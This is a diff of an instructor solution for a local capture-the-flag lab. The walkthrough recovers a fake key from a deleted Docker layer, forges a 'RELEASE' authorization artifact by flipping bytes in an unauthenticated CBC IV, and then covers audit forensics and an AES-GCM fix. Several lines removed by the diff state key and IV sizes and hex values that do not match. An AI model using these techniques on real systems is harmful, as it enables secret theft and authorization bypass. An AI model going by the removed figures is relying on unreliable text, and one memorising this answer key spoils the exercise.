@@ -1,405 +1,211 @@
 # AegisDock Instructor Solution
 
-## Complete Attack Chain
+> Instructor-only material. Do not publish this document as the learner-facing guide in a competition deployment.
 
-### Phase 1: Recon
+## 1. Expected chain
 
-**Goal**: Identify application components and attack surface.
-
-**What to do**:
-- Browse to frontend at `http://localhost:3000`
-- Try to login at `/login`
-- Enumerate API endpoints
-- Check registry simulator at `http://localhost:5000`
-
-**Expected observations**:
-- Login form visible
-- API accessible at `/api/` prefix
-- Images available at `/registry/` endpoint
-- Audit service at `/audit/` endpoint
-
-### Phase 2: Application Mapping
-
-**Goal**: Understand authentication, authorization, container operations.
-
-**What to do**:
-- Login as operator
-- Navigate to containers
-- Attempt to inspect/hold/release containers
-- Note that RELEASE appears unavailable for operators
-
-**Expected observations**:
-- Operator role (vs supervisor, security_admin)
-- Container status indicators
-- RELEASE endpoint requires elevated permissions
-- Authorization artifact mentioned in release flow
-
-### Phase 3: Container Investigation
-
-**Goal**: Discover internal container image and metadata.
-
-**What to do**:
-- Get operator login token
-- Query registry simulator: `GET /images`
-- Get image metadata: `GET /images/aegisdock-terminal-api`
-- Get build history: `GET /artifact/aegisdock-terminal-api/history`
-- Get layer info: `GET /debug/layers/aegisdock-terminal-api`
-
-**Expected observations**:
-- Image: aegisdock-terminal-api:v1.2.0-training
-- Build history shows 7 layers
-- Layer 3 contains COPY deploy/archive command
-- WARNING: Layer 3 contains sensitive deployment artifact
-
-### Phase 4: Secret Discovery
-
-**Goal**: Recover leaked cryptographic key.
-
-**What to do**:
-1. Pull the vulnerable image:
-   ```bash
-   docker pull aegisdock/api:vulnerable
-   ```
-2. Inspect layer history:
-   ```bash
-   docker history aegisdock/api:vulnerable --no-trunc
-   ```
-3. Search filesystem for secrets:
-   ```bash
-   docker create --name temp-extract aegisdock/api:vulnerable
-   docker export temp-extract | tar -x
-   find . -type f -exec grep -l "TERMINAL_CRYPTO_KEY" {} \;
-   ```
-4. Or read the docker history output:
-   ```
-   IMAGE          CREATED         CREATED BY
-   abc123...      2025-01-15      RUN rm /opt/legacy/terminal-gateway.env.bak
-   def456...      2025-01-15    COPY api/ .
-   ghi789...      2025-01-15    COPY deploy/archive/terminal-gateway.env.bak /opt/legacy/terminal-gateway.env.bak
-   jkl012...      2025-01-15    FROM php:8.3-apache
-   ```
-
-5. Read the leaked file from the old layer:
-   ```bash
-   cat abc123.../opt/legacy/terminal-gateway.env.bak
-   # or find the layer with the secret
-   docker image history --no-trunc aegisdock/api:vulnerable
-   ```
-
-**Training Key Recovery**:
-```
-TERMINAL_CRYPTO_KEY=TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12
-TERMINAL_CRYPTO_IV=TRAINING-FAKE-IV-1234567890ABC
+```text
+Reconnaissance
+  -> Local registry metadata
+  -> Download vulnerable image tar
+  -> Inspect saved image layers
+  -> Recover generated fake key/IV
+  -> Analyze CBC artifact layout
+  -> Modify the unauthenticated IV prefix
+  -> Vulnerable release controller trusts RELEASE action
+  -> Local container state changes
+  -> Audit reconstruction
+  -> Secure profile rejects tampering and enforces roles
 ```
 
-**Expected observations**:
-- Key: `TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12` (32 bytes = AES-256)
-- IV: `TRAINING-FAKE-IV-1234567890ABC` (16 bytes = CBC block alignment)
-- Warning about Docker ignore: `.dockerignore excludes deploy/archive/`
+The vulnerable Docker layer leak and the CBC weakness are distinct findings. The IV manipulation itself does not mathematically require the AES key; that is an important lesson about unauthenticated encryption. Recovering the key from the image demonstrates a separate key exposure and helps the learner decrypt and understand the artifact. The application must not treat encryption as an integrity or authorization mechanism.
 
-### Phase 5: Crypto Analysis
+## 2. Recon and authentication
 
-**Goal**: Identify cryptographic construction and weaknesses.
-
-**What to do**:
-1. Get authorization artifact as operator:
-   ```bash
-   GET /api/authorization/artifact?terminal=T-07&container=CONT-88421
-   ```
-
-2. Decode artifact:
-   ```bash
-   # The base64-encoded ciphertext
-   # Decode with: echo "<artifact>" | base64 -d
-   ```
-
-3. Check algorithm:
-   - From application source: AES-256-CBC
-   - Key recovered from Docker: TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12
-   - IV from config: TRAINING-FAKE-IV-1234567890ABC
-
-4. Verify debug endpoint:
-   ```bash
-   GET /api/debug/authorization/1
-   # Returns: algorithm, iv, ciphertext, metadata (but NOT key)
-   ```
-
-**Expected observations**:
-- Algorithm: AES-256-CBC
-- Static IV (same for every encryption)
-- No HMAC, no authentication tag
-- Plaintext structure visible after decryption
-
-### Phase 6: Authorization Artifact Discovery
-
-**Goal**: Obtain legitimate authorization artifact and understand its structure.
-
-**What to do**:
-1. Login as operator: POST /api/login with operator credentials
-2. Request artifact: GET /api/authorization/artifact?terminal=T-07&container=CONT-88421
-3. Decode and analyze Base64
-4. Verify structure: JSON with operator_id, terminal, container, action, issued_at, expires_at
-
-**Expected observations**:
-- Artifact: `base64(ciphertext)` 
-- Decrypted plaintext:
-  ```json
-  {"operator_id":1001,"terminal":"T-07","container":"CONT-88421","action":"VIEW","issued_at":1770000000,"expires_at":1770003600}
-  ```
-- Action is VIEW (not RELEASE)
-- Artifact expires after 1 hour (3600 seconds)
-- Ciphertext length predictable (5 blocks for this payload)
-
-### Phase 7: Controlled Exploitation
-
-**Goal**: Demonstrate ciphertext manipulation and authorization bypass.
-
-**What to do**:
-1. Understand CBC block structure:
-   - AES block size = 16 bytes
-   - Plaintext blocks align to JSON field boundaries
-   
-2. Manipulate ciphertext using OpenSSL or Python:
-
-```python
-# Example Python manipulation
-from Crypto.Cipher import AES
-import base64
-
-# Key and IV recovered from Docker
-key = bytes.fromhex('2852414e445f46414b452d323032352d414243444546313233343536373839304142434445463132')
-iv = bytes.fromhex('5452414e54494e4f5f4946412d31323334353637383930414243')
-
-# Ciphertext from obtained artifact
-ciphertext_b64 = "<artifact>"
-ciphertext = base64.b64decode(ciphertext_b64)
-
-# In AES-CBC, block size is 16 bytes
-# Plaintext structure (5 blocks):
-# Block 1: {"operator_id":1001
-# Block 2: "terminal":"T-07",
-# Block 3: "container":"CONT-88421",
-# Block 4: "action":"VIEW",     <-- TARGET block
-# Block 5: "issued_at":1770000000
-
-# To change action from "VIEW" to "RELEASE":
-# - In block 4, flip bits to change "VIEW" to "RELEASE"
-# - "VIEW" = 0x56494557, "RELEASE" = 0x52454C41535345 (different length!)
-# 
-# Actually, the structure makes this work because:
-# - Action field appears at specific byte offset in block 4
-# - Flipping specific bits in ciphertext block 3 affects plaintext block 4
-# - The "action" value "VIEW" → "RELEASE" requires careful bit flipping
-#
-# Simplified approach: flip bits at positions that change
-# 'V' (0x56) to 'R' (0x52), etc.
-
-# Using the vulnerability intentionally:
-# The server decrypts and trusts the action field
-# Any valid decryption result is accepted
-```
-
-3. Create manipulated artifact:
-   - Use Python/OpenSSL to flip bits in ciphertext block 3
-   - This changes plaintext block 4: "VIEW" → "RELEASE"
-   - Re-encode to Base64
-
-4. Attempt release with manipulated artifact:
-   ```bash
-   curl -X POST http://localhost/api/containers/CONT-88421/release \
-     -H "Authorization: Bearer <operator-token>" \
-     -H "X-Terminal-Authorization: <manipulated-base64>" \
-     -H "Content-Type: application/json" \
-     -d '{"reason": "authorized release"}'
-   ```
-
-**Expected observations**:
-- The server decrypts the manipulated ciphertext
-- The decrypted action field shows "RELEASE" instead of "VIEW"
-- The release operation is ACCEPTED despite operator role
-- Container status changes from READY to RELEASED
-- Audit log shows AUTHORIZATION_SUCCESS
-
-### Phase 8: Impact
-
-**Goal**: Achieve unauthorized container release simulation.
-
-**What to do**:
-1. After successful release, verify:
-   ```bash
-   # Check container status
-   curl http://localhost/api/containers/CONT-88421
-   
-   # View audit events
-   curl http://localhost/api/audit?event=CONTAINER_RELEASE
-   
-   # View authorization events
-   curl http://localhost/api/audit?event=AUTHORIZATION_SUCCESS
-   ```
-
-2. Check audit trail:
-   ```bash
-   # Check audit service
-   curl http://localhost:9000/logs
-   
-   # Look for specific events
-   curl "http://localhost:9000/logs?event=CONTAINER_RELEASE"
-   curl "http://localhost:9000/logs?event=AUTHORIZATION_SUCCESS"
-   ```
-
-**Expected observations**:
-- Container status: RELEASED (was READY)
-- AUTHORIZATION_SUCCESS event in audit trail
-- CONTAINER_RELEASE event in audit trail
-- No indication of manipulation in audit logs
-- Timestamp shows release operation time
-
-### Phase 9: Forensics
-
-**Goal**: Investigate audit trail and request logs.
-
-**What to do**:
-1. Review all audit events leading to release:
-   - Login event
-   - Authorization artifact request
-   - Release attempt
-   - Release success
-
-2. Check for additional events:
-   - Container viewed events
-   - Container inspected events
-   - Any debug endpoint access
-
-3. Look for cryptographic metadata:
-   - Algorithm references in logs
-   - IV mentions (should not expose key)
-   - Artifact timestamps
-
-4. Examine request patterns:
-   - Timing of operations
-   - Sequence of API calls
-   - Header values (Authorization, X-Terminal-Authorization)
-
-### Phase 10: Remediation
-
-**Goal**: Apply fixes and verify exploit chain no longer works.
-
-**What to do**:
-1. Build secure image:
-   ```bash
-   make build-secure
-   # or: docker build -t aegisdock/api:secure -f docker/secure/Dockerfile .
-   ```
-
-2. Update docker-compose to use secure image
-
-3. Restart services:
-   ```bash
-   make reset
-   # or: docker compose down && docker compose up -d
-   ```
-
-4. Test that exploit fails:
-   ```bash
-   # Same attack steps from Phase 7-8 should now fail
-   # - Server rejects tampered ciphertext
-   # - Operator still cannot release without supervisor role
-   # - Debug endpoint should be restricted
-   ```
-
-**Expected observations after remediation**:
-- Docker history shows NO secret leakage
-- docker image inspect shows no TRAINING-FAKE-KEY
-- Secure image has no deploy/archive/ references
-- AES-GCM rejects tampered ciphertext
-- Operator cannot release containers even with artifact
-- Debug endpoint (if present) doesn't expose exploitable data
-- Audit logs show AUTHORIZATION_FAILURE for tampered attempts
-
-## Secure Implementation Summary
-
-### What Changed
-
-| Vulnerable Feature | Secure Alternative |
-|-------------------|-------------------|
-| AES-256-CBC | AES-256-GCM |
-| Static IV | Unique nonce per encryption |
-| No authentication tag | 128-bit authentication tag verified |
-| Artifact overrides role check | Artifact secondary to server-side permissions |
-| Key stored in image | Key injected at runtime |
-| Secrets in Dockerfile | .dockerignore prevents leaks |
-
-### Test Results (Post-Remediation)
+Start the vulnerable profile and seed data:
 
 ```bash
-# Verify Docker has no secrets
-$ docker history aegisdock/api:secure --no-trunc
-# Should show NO layers with TRAINING-FAKE-KEY
-# All old layers removed or never contained secrets
-
-# Verify exploit fails
-$ curl -X POST http://localhost/api/containers/CONT-88421/release \
-  -H "X-Terminal-Authorization: <manipulated>" \
-  # Returns: 403 Forbidden - insufficient permissions
-
-# Verify secure crypto
-$ php artisan crypto:test
-# AES-GCM with unique nonce
-# Authentication tag always verified
-# Modified ciphertext rejected
+make up
+make seed
 ```
 
-## Instructor Notes
+Open http://localhost:8080 and sign in with the fake operator account:
 
-### Teaching Points
+- `operator@aegisdock.local` / `Operator123!`
 
-1. **Cryptographic failures compound**: CBC + static IV + no MAC = critical vulnerability
+Get an API token using the login endpoint:
 
-2. **Chain matters more than individual vuln**: Even strong auth can be bypassed when crypto is weak
+```bash
+curl -s http://localhost:8080/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"operator@aegisdock.local","password":"Operator123!"}'
+```
 
-3. **Docker secrets are forever**: Once in an image layer, they persist even after "removal"
+Operational endpoints require a Sanctum bearer token. Map the terminals, containers, and role boundary before testing the release operation.
 
-4. **Trust boundaries**: Server-side enforcement must be primary, never client-provided
+## 3. Obtain the image
 
-5. **AEAD is the answer**: AES-GCM provides both encryption AND integrity in one operation
+The registry simulator exposes metadata and a download endpoint. The image tar is generated locally by the Makefile; the simulator does not connect to Docker Hub or another registry.
 
-### Lab Success Criteria
+```bash
+curl -fL http://localhost:8080/registry/images/aegisdock-terminal-api/download \
+  -o /tmp/aegisdock-terminal-api.tar
+docker load -i /tmp/aegisdock-terminal-api.tar
+docker history --no-trunc aegisdock/api:vulnerable
+```
 
-Learner should be able to:
+## 4. Recover the generated training configuration
 
-- [ ] Explain the attack chain from Docker secret to authorization bypass
-- [ ] Recover the training key from image layers
-- [ ] Demonstrate CBC ciphertext manipulation
-- [ ] Show that manipulated artifact triggers release
-- [ ] Apply secure remediation
-- [ ] Verify exploit no longer works
-- [ ] Explain why AES-GCM prevents the attack
-- [ ] Configure .dockerignore properly
-- [ ] Inject secrets at runtime instead of build time
+The vulnerable Dockerfile copies `deploy/archive/terminal-gateway.env.bak` into `/opt/legacy/`, then removes it in a later layer. The setup script deletes the build-context fixture after building, but the image layer remains.
 
-### Common Student Mistakes
+```bash
+mkdir -p /tmp/aegisdock-image
+docker save aegisdock/api:vulnerable -o /tmp/aegisdock-image.tar
+tar -xf /tmp/aegisdock-image.tar -C /tmp/aegisdock-image
 
-1. **Guessing byte positions randomly**: The exercise is designed so fields are predictably aligned. Help them understand block structure.
+for layer in $(find /tmp/aegisdock-image -name layer.tar); do
+  if tar -tf "$layer" 2>/dev/null | grep -q 'opt/legacy/terminal-gateway.env.bak'; then
+    tar -xOf "$layer" opt/legacy/terminal-gateway.env.bak
+  fi
+done
+```
 
-2. **Thinking TLS fixes everything**: TLS protects in transit, not the crypto construction itself.
+The recovered file contains random fake values named `TERMINAL_CRYPTO_KEY_HEX` and `TERMINAL_CRYPTO_IV_HEX`. Values differ between fresh local setups. Do not put them into documentation, commits, or screenshots.
 
-3. **Assuming image layer removal is sufficient**: Explain Docker's layer architecture.
+The final container filesystem should not expose the file:
 
-4. **Missing the role check vs artifact trust issue**: Emphasize that the artifact should NEVER override server-side permissions.
+```bash
+docker run --rm --entrypoint sh aegisdock/api:vulnerable \
+  -c 'test ! -e /opt/legacy/terminal-gateway.env.bak'
+```
 
-5. **Not understanding nonce uniqueness**: With CBC + static IV, same plaintext = same ciphertext. With GCM, each encryption is unique.
+## 5. Inspect an authorization artifact
 
-## FLAG System Reference
+Use the operator token to request an artifact for the primary scenario:
 
-| Flag | When Earned |
-|------|-------------|
-| FLAG-01 | Recon phase complete |
-| FLAG-02 | Container image discovered |
-| FLAG-03 | Docker layer secret found |
-| FLAG-04 | Training key recovered |
-| FLAG-05 | Crypto construction identified |
-| FLAG-06 | Authorization artifact obtained |
-| FLAG-07 | Ciphertext manipulation demonstrated |
-| FLAG-08 | Unauthorized release achieved |
-| FLAG-09 | Forensic audit complete |
-| FLAG-10 | Remediation applied and verified |
+```bash
+curl -s 'http://localhost:8080/api/authorization/artifact?terminal=T-07&container=CONT-88421' \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+The response includes an artifact ID and a Base64 artifact. The authenticated debug endpoint reports the algorithm, IV, ciphertext length, expiry, and selected metadata; it never returns the key.
+
+```bash
+curl -s http://localhost:8080/api/debug/authorization/ARTIFACT_ID \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+## 6. Deterministic CBC manipulation
+
+The vulnerable artifact format is:
+
+```text
+Base64(16-byte IV || CBC ciphertext)
+
+Decrypted plaintext:
+bytes 0..7  : fixed-width action field
+byte 8      : separator
+bytes 9..15 : spaces
+byte 16+    : JSON metadata
+```
+
+The original action field is eight bytes: `VIEW    `. The desired field is also eight bytes: `RELEASE `.
+
+CBC's first plaintext block is:
+
+```text
+P1 = D_K(C1) XOR IV
+```
+
+For each of the first eight bytes, calculate:
+
+```text
+delta[i] = original_action[i] XOR desired_action[i]
+new_IV[i] = old_IV[i] XOR delta[i]
+```
+
+Change only the first eight bytes of the IV prefix in the decoded artifact; leave the ciphertext unchanged and Base64-encode the modified IV plus ciphertext. The JSON metadata begins in the next block, so this change preserves it. The artifact is unauthenticated, so the server has no tag or MAC with which to detect the modification.
+
+Use Burp Repeater or a manual decoder/editor in the local lab. Do not run this against any external service.
+
+## 7. Demonstrate impact
+
+Send the modified artifact with the operator token:
+
+```http
+POST /api/containers/CONT-88421/release
+Authorization: Bearer <operator-token>
+X-Terminal-Authorization: <modified-base64-artifact>
+Content-Type: application/json
+
+{"reason":"scheduled release"}
+```
+
+The vulnerable release controller trusts the decrypted RELEASE action when an artifact is supplied and skips the normal role check. The operation changes only the local database state from READY to RELEASED. No physical terminal or external system is contacted.
+
+A normal VIEW artifact should be rejected by the release endpoint. A request without an artifact should also be denied to an operator. This baseline is important: the intended chain depends on the artifact being accepted after its action field is altered.
+
+## 8. Forensics
+
+Use the authenticated audit endpoint:
+
+```bash
+curl -s http://localhost:8080/api/audit \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+Look for a timeline containing the release attempt, authorization result, and container release. Correlate user ID, container, terminal, timestamp, IP, user-agent, action, and result. The application must never log the actual key.
+
+## 9. Remediation verification
+
+Build and start the secure profile:
+
+```bash
+make secure-up
+```
+
+The secure profile uses a separate runtime-mounted key and AES-256-GCM with a unique nonce and authentication tag. The secure release path enforces server-side role authorization before considering the artifact and binds any supplied artifact to the authenticated user, terminal, container, action, and expiry.
+
+Verify:
+
+- An operator cannot release a container, even with a valid artifact.
+- A supervisor can perform an authorized simulated release.
+- A modified secure artifact fails authentication.
+- Expired artifacts are rejected.
+- The secure Docker image does not contain the generated key/IV values in any layer.
+- The vulnerable image's final filesystem lacks the removed archive file.
+- Audit records remain useful and contain no key material.
+
+```bash
+make test
+docker history --no-trunc aegisdock/api:secure
+trivy image aegisdock/api:secure
+```
+
+## 10. Core teaching points
+
+- Docker layer deletion does not erase historical bytes.
+- Key exposure and ciphertext malleability are separate weaknesses.
+- CBC without authentication does not guarantee integrity.
+- An unauthenticated IV can change the first plaintext block predictably.
+- Encrypted client data is not a substitute for server-side authorization.
+- AEAD, runtime-only secrets, role checks, and regression tests break different links in the chain.
+
+## 11. Flag locations
+
+Flag values are generated randomly by the local setup script. Never paste actual generated values into documentation or commit them.
+
+| Flag | Discovery point |
+|---|---|
+| FLAG-01 | Registry image list response |
+| FLAG-02 | Registry image detail response |
+| FLAG-03 | Historical image layer archive |
+| FLAG-04 | Historical deployment configuration alongside the recovered key/IV |
+| FLAG-05 | Authenticated authorization debug metadata |
+| FLAG-06 | Authorization artifact response |
+| FLAG-07 | `AUTHORIZATION_SUCCESS` audit record after a vulnerable artifact is accepted |
+| FLAG-08 | Vulnerable simulated release response |
+| FLAG-09 | `CONTAINER_RELEASE` database audit record |
+| FLAG-10 | `GET /api/security/verification` in secure mode |
+
+Authenticated learners submit discovered values through `POST /api/flags/submit`. The database stores the user/code completion, not the flag value itself.
